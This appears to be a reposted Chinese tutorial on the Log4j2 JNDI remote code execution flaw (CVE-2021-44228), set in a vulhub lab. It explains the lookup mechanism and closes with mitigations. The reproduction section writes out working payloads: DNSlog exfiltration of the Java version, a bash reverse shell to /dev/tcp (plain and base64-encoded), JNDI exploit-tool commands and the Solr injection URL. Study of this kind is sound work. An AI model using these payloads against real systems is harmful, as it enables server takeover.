<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/9rP5fcFSAlfOMoVobtwTFg)

扫码领资料

获网安教程

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFJNibV2baHRo8G34MZhFD1sjTz4LHLiaKG9208VTU6pdTIEpC9jlW6UVfhIb9rHorCvvMsdiaya4T6Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

log4j2 原理分析及漏洞复现
================

### 0x01 log4j2 简介

> Log4j2 是一个用于 Java 应用程序的成熟且功能强大的日志记录框架。它是 Log4j 的升级版本，相比于 Log4j，Log4j2 在性能、可靠性和灵活性方面都有显著的改进。

Log4j2 特点

> 1.  高性能：Log4j2 使用异步日志记录机制，可以提供比传统同步日志记录更高的吞吐量和更低的延迟，因此在高负载情况下仍然能够保持出色的性能。
>     
> 2.  灵活的配置：Log4j2 的配置文件使用 XML、JSON 或 YAML 格式，允许将日志的格式、目标以及日志级别等属性进行灵活的配置和定制。
>     
> 3.  多种输出目标：Log4j2 支持多种日志输出目标，包括控制台、文件、数据库、远程套接字、JMS 和 Apache Flume 等。你可以根据需求配置日志输出到不同的目标。
>     
> 4.  强大的过滤器和路由：Log4j2 支持过滤器功能，可以根据日志的级别、源、线程等条件进行过滤，在满足条件时决定是否记录日志。此外，还可以基于日志的特定属性进行路由，将不同的日志记录到不同的目标。
>     
> 5.  按需加载插件：Log4j2 使用插件架构，允许按需加载各种附加组件和扩展功能，如自定义输出目标、格式器、过滤器等。这使得 Log4j2 的功能可以根据需要进行扩展和定制。
>     
> 6.  上下文容器：Log4j2 提供了 ThreadContext 和 ContextMap 等上下文容器，用于在多线程环境中跟踪和管理日志记录。这对于识别和调试特定线程的日志非常有用。
>     

总体而言，Log4j2 是一个功能强大且灵活的日志记录框架，旨在提供高性能的日志记录解决方案。它被广泛用于各种 Java 应用程序和框架中，帮助开发人员更好地管理和分析应用程序的日志信息。

Log4j2 组件的应用

以下是一些使用 Log4j2 组件的中间件和应用程序的常见示例：

1.  Apache Tomcat - Java Web 服务器
    
2.  Apache Kafka - 分布式流处理平台
    
3.  Apache ActiveMQ - 开源消息队列系统
    
4.  Elasticsearch - 分布式搜索和分析引擎
    
5.  Spring Framework - Java 开发框架
    
6.  Hibernate ORM - 对象关系映射框架
    
7.  Apache Camel - 企业集成模式框架
    
8.  Apache Solr - 开源搜索平台
    
9.  Apache Druid - 实时分析数据库
    
10.  Apache NiFi - 数据流处理系统
    
11.  Apache Flink - 分布式流处理框架
    
12.  Apache Hadoop - 分布式计算框架
    
13.  Apache Spark - 分布式大数据处理框架
    
14.  Apache Storm - 实时流处理框架
    
15.  Alfresco - 开源企业内容管理系统
    
16.  Atlassian JIRA - 项目管理和缺陷追踪工具
    
17.  Jenkins - 持续集成和交付平台
    
18.  SonarQube - 代码质量管理平台
    
19.  Liferay - 企业门户和内容管理系统
    
20.  Graylog - 日志管理和分析平台
    

### 0x02 CVE-2021-44228

##### 漏洞简介：

Apache Log4j2 是一个基于 Java 的日志记录工具，当前被广泛应用于业务系统开发，开发者可以利用该工具将程序的输入输出信息进行日志记录。

2021 年 11 月 24 日，阿里云安全团队向 Apache 官方报告了 Apache Log4j2 远程代码执行漏洞。该漏洞是由于 Apache Log4j2 某些功能存在递归解析功能，导致攻击者可直接构造恶意请求，触发远程代码执行漏洞，从而获得目标服务器权限。

在 java 中最常用的日志框架是 log4j2 和 logback，其中 log4j2 支持 lookup 功能（查找搜索），这也是一个非常强大的功能，设计之初的目的也是为了方便开发者调用

例如当开发者想在日志中打印今天的日期，则只需要输出 ${data:MM-dd-yyyy}，此时 log4j 会将 ${} 中包裹的内容单独处理，将它识别为日期查找，然后将该表达式替换为今天的日期内容输出为 “08-22-2022”，这样做就不需要开发者自己去编写查找日期的代码。

表达式除了支持日期，还支持输出系统环境变量等功能，这样极大的方便了开发者。但是安全问题往往就是因为 “图方便” 引起的，毕竟设计者也是需要在安全性和用户体验之间做个平衡。

其实打印日期，打印系统变量这种对系统而言构不成什么威胁，最终要的原因是 log4j 还支持 JNDI 协议。

##### 漏洞适用版本

2.0 <= Apache log4j2 <= 2.14.1

##### 漏洞原理

Apache log4j2-RCE 漏洞是由于 Log4j2 提供的 lookup 功能下的 Jndi Lookup 模块出现问题所导致的，该功能模块在输出日志信息时允许开发人员通过相应的协议去请求远程主机上的资源。而开发人员在处理数据时，并没有对用户输入的信息进行判断，导致 Log4j2 请求远程主机上的含有恶意代码的资源 并执行其中的代码，从而造成远程代码执行漏洞。

log4j 是一款通用日志记录工具，开发人员可以使用 log4j 对当前程序状态进行记录。log4j 的功能非常强大，开发人员除了直接记录文本外，还可以使用简单表达式记录动态内容，例如：

```
logger.info("system propety: ${sys:user.dir}");


```

###### lookup 功能

Lookup 是一种机制，用于动态获取和替换日志记录中的变量或属性的值。它提供了一种灵活的方式，可以在日志消息中引用、解析和插入各种上下文相关的信息。

Log4j2 内置了多个 Lookup 实现，每个 Lookup 都有不同的用途和功能。以下是一些常见的 Lookup 类型：

1.  ${date}：获取当前日期和时间，支持自定义格式。
    
2.  ${pid}：获取当前进程的 ID。
    
3.  ${logLevel}：获取当前日志记录的级别。
    
4.  ${sys:propertyName}：获取系统属性的值，例如 ${sys:user.home} 获取用户主目录。
    
5.  ${env:variableName}：获取环境变量的值，例如 ${env:JAVA_HOME} 获取 Java 安装路径。
    
6.  ${ctx:key}：获取日志线程上下文（ThreadContext）中指定键的值。
    
7.  ${class:fullyQualifiedName:methodName}：获取指定类的静态方法的返回值。
    
8.  ${mdc:key}：获取 MDC (Mapped Diagnostic Context) 中指定键的值。
    

使用 ${} 进行包裹，上述示例中，sys:user.dir 表示使用 sys 解析器，查找 user.dir 的内容，即在系统环境变量中查找 user.dir，以替换 ${sys:user.dir} 进行打印。

log4j 中除了 sys 解析器外，还有很多其他类型的解析器。其中，jndi 解析器就是本次漏洞的源头。

###### jndi 解析器

jndi 解析器将通过 jdk 获取 jndi 对象，并使用这个 jndi 对象替换原有文本进行打印。 我们将 jndi 对象理解成为一个从程序外部获取的 Java 程序对象就可以了。jdk 中提供了多种不同 jndi 对象的获取方式，获取方式可以称为 schema，所以正常的包含 jndi 的日志记录方式如下：

```
logger.info("system propety: ${jndi:schema://url}");


```

其中，schema 是查找 jndi 对象的方式，jdk 中支持 corbname, dns, iiop, iiopname, ldap, ldaps, rmi 几种 schema。

url 是几种不同的 schema 下 jndi 的路径。不同的 schema，url 路径的配置方法不同。常用的 schame 是 ldap，其 url 写法比较简单：`jndi:ldap://xxx.dnslog.cn`

jdk 将从 url 指定的路径下载一段字节流，并将其反序列化为 Java 对象，作为 jndi 返回。反序列化过程中，即会执行字节流中包含的程序。

因此，如果攻击者能够控制日志打印的内容，就可以使目标服务器从攻击者指定的任意 url 地址下载代码字节流，攻击者在字节流中附带的代码就会在目标服务器上执行。

攻击者如何控制服务器上记录的日志内容呢？

大部分 web 服务程序都会对用户输入进行日志记录。例如：用户访问了哪些 url，有哪些关键的输入等，都会被作为参数送到 log4j 中，我们在这些地方写上 ${jndi:ldap://xxx.dnslog.cn} 就可以使 web 服务从 xxx.dnslog.cn 下载字节流了。

###### jndi 是什么

> JNDI（Java Naming and Directory Interface，JAVA 命名和目录接口）：它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。JNDI 下面有很 多目录接口，用于不同的数据源的查找引用。

JNDI 注入主要是用下载远程 class，来运行恶意代码。JNDI 注入攻击时常用的就是通过 RMI 和 LDAP 两种服务。

###### ldap 服务

> LDAP(轻型目录访问协议) 是一个开放的，中立的，工业标准的应用协议，通过 IP 协议提供访问 控制和维护分布式信息的目录信息。

目录是一个为查询、浏览和搜索而优化的专业分布式数据库，它呈 树状结构组织数据，就好象 Linux/Unix 系统中的文件目录一样

###### RMI

RMI（远程方法调用）：它是一种机制，能够让在某个 java 虚拟机上的对象调用另一个 Java 虚拟机 的对象的方法。

### 0x03 攻击过程

log4j2 远程代码执行漏洞大致过程（此处使用 RMI，LDAP 同理）： 假设有一个 Java 程序，将用户名信息到了日志中，如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSF8IGDicUGmiazg0icv8Sgh18nJsSK2Q4fY2KwyibLClNRETcibQzU25J1VLbl5kon1VQJ7taprNQcCcqg/640?wx_fmt=jpeg&from=appmsg)

a. 攻击者发送一个 HTTP 请求，其用户名为 ${jndi://rmi: 服务器地址 / Exploit}

b. 被攻击服务器发现要输出的信息中有 ${}，则其中的内容要单独处理，进一步解析是 JNDI 扩展内容且使用的是 RMI，而后根据 RMI 服务器地址去请求 Exploit。

c.RMI 服务器返回 Reference 对象（用于告诉请求端所请求对象所在的类），而该 Reference 指定了远端 文件下载服务器上含有恶意代码的 class 文件。

d. 被攻击服务器通过 Reference 对象去请求文件下载服务器上的 class 文件。

e. 被攻击服务器下载恶意 class 文件并执行其中的恶意代码

LDAP  
当用户输入信息时，应用程序中的 log4j2 组件会将信息记录到日志中

a. 假如日志中含有该语句 ${jndi:ldap:192.168.96.1:1099/exp}

b. 被攻击服务器发现要输出的信息中有 ${}，log4j 就会去解析该信息，通过 jndi 的 lookup() 方法去解析该 URL：ldap:192.168.96.1:1099/exp

c. 解析到 ldap，就会去 192.168.61.129:1099 的 ldap 服务找名为 exp 的资源，如果找不到就会去 http 服务中找，在 http 中找到 exp 之后，就会将资源信息返回给应用程序的 log4j 组件，而 log4j 组件就会下载下来，然后发现 exp 是一个. class 文件，就会去执行里面的代码，从而实现注入攻击者就可以通过 shell 实现任意的命令执行，造成严重危害

### 0x04 漏洞复现

##### 漏洞环境

靶机：kali 192.168.100.134 vulhub/log4j/CVE-2021-44228

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSF8IGDicUGmiazg0icv8Sgh18nRV7vdjsFBmkGKbh2gPfp3iaxBqGh5iaprWdCaley8n6KW30DcctAQmQQ/640?wx_fmt=jpeg&from=appmsg)

攻击机：windows 10 192.168.100.143

或者本地物理机

新版本工具地址：

exp:https://github.com/WhiteHSBG/JNDIExploit/releases/tag/v1.4

老版本工具地址：

exp:https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0

##### 1. 访问靶机

靶机 ip:8983

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSF8IGDicUGmiazg0icv8Sgh18nXfskxbr3cGuMicsv294gnctgCORyQnh2kAM2KhuXjibm9aW4dzAtJ2Uw/640?wx_fmt=jpeg&from=appmsg)

##### 2.dns 回显验证

在注入点插入 Payload

```
/solr/admin/cores?action=${jndi:ldap://vbdpkn.ceye.io}


```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSF8IGDicUGmiazg0icv8Sgh18nibrc0zxuPYHdoB2y3BiacxsHia7b2cfhC4qW9oWLHFMA8ZpdEjGnLowwg/640?wx_fmt=jpeg&from=appmsg)

查看 cecy 是否返回数据

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSF8IGDicUGmiazg0icv8Sgh18nOiaeTTefU6qsK1BQJsCIIh8aMqOHqfpqS6BXhzr1iavbXKR3unbwwibSQ/640?wx_fmt=jpeg&from=appmsg)

查看 java 版本

```
${jndi:ldap://${sys:java.version}.vbdpkn.ceye.io}
${jndi:rmi://${sys:java.version}.vbdpkn.ceye.io}
${jndi:ldap://DNSlog地址/exp} //DNSolg地址


```

成功通过 dnslog 带了出来，对应的 java 版本

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSF8IGDicUGmiazg0icv8Sgh18nBZiarUHYNHrO9odIA48HvbLoPebibGx5TwRm46usAeeeoDXroic5rdIxw/640?wx_fmt=jpeg&from=appmsg)

##### 3. 将 bash 反弹 shell 命令编码备用

bash 命令反弹 shell

```
bash -i >& /dev/tcp/192.168.100.143/8888 0>&1


```

*   `bash`: 启动一个 Bash shell。
    
*   `-i`: 打开一个交互式 shell 会话，允许用户输入命令和获取输出。
    
*   `>& /dev/tcp/192.168.100.143/8888`: 将标准输出和标准错误输出重定向到指定的 IP 地址为`192.168.100.143`、端口号为 `8888 ’ TCP 连接。换句话说，它将尝试建立一个与该 IP 地址和端口号连接的网络套接字，并将输出发送到该连接。
    
*   `0>&1`: 将标准输入（文件描述符 0）重定向到标准输出（文件描述符 1），意味着输入和输出都将通过网络套接字进行传输。
    

base64 编码：

```
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xNDMvODg4OCAwPiYx


```

##### 4. 使用 JNDIExploit 进行漏洞利用

将上面 base64 编码后的 bash 命令填入指定位置

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar　-C "bash -c {echo,Base64编码后的Payload} | {base64,-d} | {bash,-i}" -A "攻击机IP"

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xNDMvODg4OCAwPiYx}|{base64,-d}|{bash,-i}" -A "192.168.100.143"


```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSF8IGDicUGmiazg0icv8Sgh18nbnzRU0gdTPaEX8dknx6c9XbJBUctSNrxIaAN1L9CBzIiazfl0XuWOzA/640?wx_fmt=jpeg&from=appmsg)

##### 5. 在攻击机中开启监听

```
nc -lvvp 8888


```

##### 6. 使用 payload 的进行攻击

```
http://192.168.100.134:8983/solr/admin/cores?action=${jndi:ldap://192.168.100.143:1389/isimox}

//将工具生成的JNDI链接服务放到url里面进行执行


```

##### 7. 查看回显

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSF8IGDicUGmiazg0icv8Sgh18ng6nveGyukibZ3qibXrayEiaw3yOEBxKaYqPjrxpE9BzDicGzMVAGXzwCvg/640?wx_fmt=jpeg&from=appmsg)

反弹 shell 成功；

新版本工具使用：

其他基本操作，通过 DNSlog 判断回显同以上一致

可查看帮助：

```
java -jar JNDIExploit-1.4-SNAPSHOT.jar -h


```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSF8IGDicUGmiazg0icv8Sgh18nCwCtN2U96lTljTSrkz0YmicYsUjOTxjnbhL3aFEqAg3KbSZeryoqCfQ/640?wx_fmt=jpeg&from=appmsg)

首先开启 LDAP 和 HTTP 服务：

```
java -jar JNDIExploit-1.4-SNAPSHOT.jar  -i 192.168.100.1 //攻击者IP

//可通过加参数来修改LDAP和HTTP服务的端口，具体参考--help帮助


```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSF8IGDicUGmiazg0icv8Sgh18nGegg7U2MibFYFBfXH7NtJKTgTNdS2n4Yysxk30yfqrIiarRhKZkeKVlQ/640?wx_fmt=jpeg&from=appmsg)

```
java -jar JNDIExploit-1.4-SNAPSHOT.jar  -i 192.168.100.1 -u 
//查看用法


```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSF8IGDicUGmiazg0icv8Sgh18nEZ0U6qSJKqfrjtETucrB5pQibqaYAGBMXjYuKDsv2bVoicAvary1TPsA/640?wx_fmt=jpeg&from=appmsg)

```
选择上面的任意一个ldap服务：
比如：
ldap://192.168.100.1:1389/Basic/ReverseShell/[ip]/[port]
构造：
ldap://192.168.100.1:1389/Basic/ReverseShell/192.168.100.1/8888
//攻击ip和监听端口


```

本地开启监听：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSF8IGDicUGmiazg0icv8Sgh18n3QgdvuStTjCSmVHicpbnoYNjmbAKAiagh0SrX8TBlMBhDWcibEXQb4ibNA/640?wx_fmt=jpeg&from=appmsg)

将构造的内容填入到 ${jndi:} 当中，执行 url

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSF8IGDicUGmiazg0icv8Sgh18no668cp7WYn7EgMQeF9uAw3P8iaSvamZGRfoMmp4p3tWY0h18FYMmgwQ/640?wx_fmt=jpeg&from=appmsg)

点击执行后，开启的 LDAP 和 HTTP 服务的监听端会返回信息：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSF8IGDicUGmiazg0icv8Sgh18nU5aeCQpZqM2j1juefM97fZickq0gETLajUD3yAiahM1L8sXWJxSNibf0g/640?wx_fmt=jpeg&from=appmsg)

再看本地监听的端口返回：

成功反弹 shell

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSF8IGDicUGmiazg0icv8Sgh18naOUR5ZUN3YMvR0icg2TYhqic8HXkr9icXSbjTvpKAPWibbXLNUicV8hgWFw/640?wx_fmt=jpeg&from=appmsg)

### 0x05 漏洞修复

*   更新 log4j 至 rc2
    
*   配置防火墙策略，禁止主动连接外网设备
    
*   升级受影响的应用及组件
    
*   过滤相关的关键词，比如 ${jndi://*}
    
*   限制 JNDI 默认可以使用的协议
    
*   限制可以通过 LDAP 访问的服务器和类
    

```
来源: https://www.freebuf.com/articles/web/380568.html

```

声明：⽂中所涉及的技术、思路和⼯具仅供以安全为⽬的的学习交流使⽤，任何⼈不得将其⽤于⾮法⽤途以及盈利等⽬的，否则后果⾃⾏承担。**所有渗透都需获取授权**！

@

**学习更多渗透技能！体验靶场实战练习**

```
（hack视频资料及工具）


（部分展示）

往期推荐

【精选】SRC快速入门+上分小秘籍+实战指南

爬取免费代理，拥有自己的代理池

漏洞挖掘｜密码找回中的套路

渗透测试岗位面试题(重点：渗透思路)

漏洞挖掘 | 通用型漏洞挖掘思路技巧

干货｜列了几种均能过安全狗的方法！

一名大学生的黑客成长史到入狱的自述

攻防演练｜红队手段之将蓝队逼到关站！

巧用FOFA挖到你的第一个漏洞




看到这里了，点个“赞”、“再看”吧

```